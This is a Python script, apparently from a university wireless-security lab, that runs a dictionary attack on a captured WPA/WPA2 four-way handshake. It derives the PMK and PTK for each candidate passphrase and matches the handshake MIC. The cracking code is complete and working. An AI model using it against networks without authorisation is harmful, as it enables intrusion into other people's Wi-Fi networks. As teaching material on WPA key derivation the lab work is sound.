#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""

Brute force passphrase using the MIC in the 4th messages in a 4-way handshake.

Modified by Polier Florian and Tran Eric.

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
# La dépendance est inclue dans pbkdf2
# from pbkdf2_math import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
from numpy import loadtxt
from numpy import str
import hmac, hashlib
import argparse


def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]



# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap")
# Charge le dictionnaire
parser = argparse.ArgumentParser()
parser.add_argument("dictionary", help="Dictionary containing passphrases")
args = parser.parse_args()
with open(args.dictionary) as f1 :
	    dic = loadtxt(f1, dtype=str, ndmin=1)

# Important parameters for key derivation - most of them can be obtained from the pcap file
passPhrase  = "actuelle"
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        =  wpa[0].info.decode('utf-8')
APmac       = a2b_hex(wpa[0].addr2.replace(':',''))
Clientmac   = a2b_hex(wpa[1].addr1.replace(':',''))

# Authenticator and Supplicant Nonces
ANonce      = a2b_hex(wpa[5][EAPOL].load[13:13+0x20].hex())
SNonce      = a2b_hex(wpa[6][EAPOL].load[13:13+0x20].hex())

# 7 : ACK with GTK encrypted by KEK and authenticated by KCK
# 8 : ACK authenticated by KCK


# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_to_test = wpa[8][EAPOL].load[-18:-2].hex()
B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

data       = a2b_hex((wpa[8][EAPOL].original[:-20] + b"\x00"*20).hex())

print ("\n\nValues used to derivate keys")
print ("============================")
print ("Passphrase: ",passPhrase,"\n")
print ("SSID: ",ssid,"\n")
print ("AP Mac: ",b2a_hex(APmac),"\n")
print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
print ("AP Nonce: ",b2a_hex(ANonce),"\n")
print ("Client Nonce: ",b2a_hex(SNonce),"\n")
ssid = str.encode(ssid)
wpaVersion = wpa[8][EAPOL].load[2] #Contient la version description de la clé
# Test chaque passephrase du dictionnaire
for i in range(len(dic)):
    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    passPhrase = str.encode(dic[i])
    
    pmk = pbkdf2(hashlib.sha1 if wpaVersion == 10 else hashlib.md5,passPhrase, ssid, 4096, 32)

    #expand pmk to obtain PTK
    ptk = customPRF512(pmk,str.encode(A),B)

    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16],data,hashlib.sha1).hexdigest()[:-8]

    print("Mic to test : ", mic_to_test, "\n")
    print("Mic generated : ", mic, "\n")
    if mic == mic_to_test :
        print("Good passphrase : ", passPhrase.decode() , "\n")
        break
    else :
        print("Bad passphrase : ", passPhrase.decode(), "\n")
        if i == len(dic) - 1:
            print("Passphrase not in dictionary")


